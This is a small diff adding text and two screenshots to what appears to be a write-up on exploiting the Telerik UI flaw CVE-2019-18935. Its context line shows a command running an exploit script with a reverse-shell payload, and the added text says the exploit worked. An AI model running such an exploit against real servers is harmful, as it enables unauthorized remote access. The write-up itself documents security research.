@@ -83,3 +83,16 @@ python3 CVE-2019-18935.py -v 2017 -p payloads/reverse-shell-XXXXXXXXXXXXXX-amd64
   
 &nbsp;
   
+The exploit actually works, with the execution time of the script over 10 seconds:
+  
+&nbsp;
+  
+<img src="/img/Telerik_RCE/10sec.png" style="width:60%;height:60%;display:block;margin-left:auto;margin-right:auto;" alt="payload_compilation">
+  
+&nbsp;
+ 
+  
+  
+&nbsp;
+  
+<img src="/img/Telerik_RCE/revshell.png" style="width:60%;height:60%;display:block;margin-left:auto;margin-right:auto;" alt="payload_compilation">
